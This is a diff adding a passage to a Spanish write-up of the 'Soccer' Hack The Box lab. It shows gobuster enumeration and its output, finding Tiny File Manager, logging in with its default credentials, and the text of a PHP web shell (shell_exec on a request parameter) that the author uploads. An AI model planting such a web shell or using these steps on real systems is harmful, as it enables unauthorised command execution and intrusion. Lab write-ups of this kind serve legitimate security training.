@@ -101,6 +101,49 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Al ver que tiene el puerto 80 abierto probamos a entrar en la pagina.
 
+![image](https://user-images.githubusercontent.com/109216235/208489642-f0fdbbd5-d3fe-4d64-97f6-56b70d41dbec.png)
+
+Al ver esto significa que tenemos que actualizar nuestra carpeta de /etc/hosts añadiendo la IP y la url soccer.htb
+
+Una vez dentro, probamos a buscar que subdirectorios tiene. 
+
+```gobuster
+gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://soccer.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Timeout:                 10s
+===============================================================
+2022/12/19 13:02:12 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 162]
+/.htaccess            (Status: 403) [Size: 162]
+/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
+Progress: 20429 / 20470 (99.80%)===============================================================
+2022/12/19 13:04:38 Finished
+```
+
+Usando la herramienta "gobuster" descubrimos que tiene un subdirectorio llamado "tiny"
+
+![image](https://user-images.githubusercontent.com/109216235/208491633-e084a3e6-4f79-429d-863f-116fc812e1f3.png)
+
+Buscamos sobre "Tiny File Manager" y descubrimos que tiene un github con las credenciales por defecto (https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php)
+
+Mirando por la página vemos que podemos subir archivos en la carpeta "tiny". Nos preparamos una cmd en php y la subimos a la página
+
+```php
+<?php
+echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
 
 
 # [](#header-2) Vulnerabilidad
